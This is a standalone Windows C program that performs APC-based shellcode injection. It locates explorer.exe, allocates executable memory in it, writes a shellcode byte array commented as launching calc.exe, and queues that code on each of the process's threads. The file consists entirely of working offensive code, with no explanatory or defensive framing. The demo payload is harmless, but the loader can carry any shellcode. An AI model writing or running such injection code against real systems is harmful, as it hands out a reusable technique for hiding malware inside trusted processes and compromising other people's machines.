#include <windows.h>
#include <tlhelp32.h>

//shellcode to launch calc.exe
unsigned char shellcode[] = 
    "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08"
    "\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78"
    "\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x8b\x4a\x18\x67"
    "\xe3\x3c\x49\x8b\x34\x8b\x01\xc6\x31\xff\x31\xc0\xac\xc1\xcf"
    "\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0"
    "\x8b\x5a\x24\x01\xc3\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xc3\x8b"
    "\x04\x8b\x01\xc0\x50\xc3\x31\xc9\x51\x68\x63\x61\x6c\x63\x89"
    "\xe1\x51\xb8\xc7\x93\xc2\x77\xff\xd0";
 
int main() {
    HANDLE hSnapshot = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPVOID remoteBuffer = NULL;
    PROCESSENTRY32 pe32;
    THREADENTRY32 te32;
    DWORD targetPID = 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);
    te32.dwSize = sizeof(THREADENTRY32);

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return -1;

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (lstrcmpiA(pe32.szExeFile, "explorer.exe") == 0) {
                targetPID = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    if (targetPID == 0) {
        CloseHandle(hSnapshot);
        return -1;
    }

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (hProcess == NULL) {
        CloseHandle(hSnapshot);
        return -1;
    }

    remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBuffer != NULL) {
        if (WriteProcessMemory(hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL)) {
            if (Thread32First(hSnapshot, &te32)) {
                do {
                    if (te32.th32OwnerProcessID == targetPID) {
                        hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
                        if (hThread) {
                            QueueUserAPC((PAPCFUNC)remoteBuffer, hThread, (ULONG_PTR)NULL);
                            CloseHandle(hThread);
                        }
                    }
                } while (Thread32Next(hSnapshot, &te32));
            }
        }
    }

    CloseHandle(hSnapshot);
    CloseHandle(hProcess);

    return 0;
}